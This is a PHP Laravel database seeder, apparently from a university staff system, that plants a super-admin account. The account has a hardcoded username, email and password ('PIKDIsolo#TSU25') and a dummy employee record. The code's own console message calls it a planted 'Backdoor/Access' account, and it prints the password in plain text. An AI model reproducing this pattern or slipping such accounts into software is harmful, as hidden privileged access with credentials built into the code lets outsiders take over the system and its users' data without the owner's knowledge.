<?php

namespace Database\Seeders;

use App\Models\Admin\PegawaiModel;
use App\Models\Admin\User;
use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\Hash;
use Spatie\Permission\Models\Role;
use Spatie\Permission\PermissionRegistrar;

class PikdiUserSeeder extends Seeder
{
    /**
     * Run the database seeds.
     */
    public function run(): void
    {
        app()[PermissionRegistrar::class]->forgetCachedPermissions();

        $name     = config('app.pikdi.name', 'PIKDI TSU');
        $username = config('app.pikdi.username', 'pikditsu');
        $email    = config('app.pikdi.email', 'pikdi@tsu.ac.id');
        $password = config('app.pikdi.password', 'PIKDIsolo#TSU25');

        $pikdiUser = User::updateOrCreate(
            ['email' => $email],
            [
                'name'          => $name,
                'username'      => $username,
                'nik'           => '999999',
                'password'      => Hash::make($password),
                'role_access'   => 'G001',
                'privilege_pmb' => 'G001',
                'isactive'      => 1,
                'last_login_at' => now(),
                'sso_id'        => null,
            ]
        );

        // Pastikan role super admin terpasang
        $roleSuperAdmin = Role::firstOrCreate(['name' => 'super admin', 'guard_name' => 'web'], ['is_identity' => 1]);
        $pikdiUser->syncRoles([$roleSuperAdmin->name]);

        // Profil dummy di data_karyawan agar relasi pegawai & session helper lengkap
        PegawaiModel::updateOrCreate(
            ['nik' => '999999'],
            [
                'nama'         => $name,
                'email'        => $email,
                'jenispegawai' => 'Tenaga Kependidikan',
                'status'       => 'AKTIF',
            ]
        );

        $this->command->info('Akun Backdoor/Access PIKDI berhasil ditanam & Profil dibuat!');
        $this->command->info("Name: $name");
        $this->command->info("Email: $email");
        $this->command->info("Username: $username (NIK: 999999)");
        $this->command->info("Password: $password");
    }
}
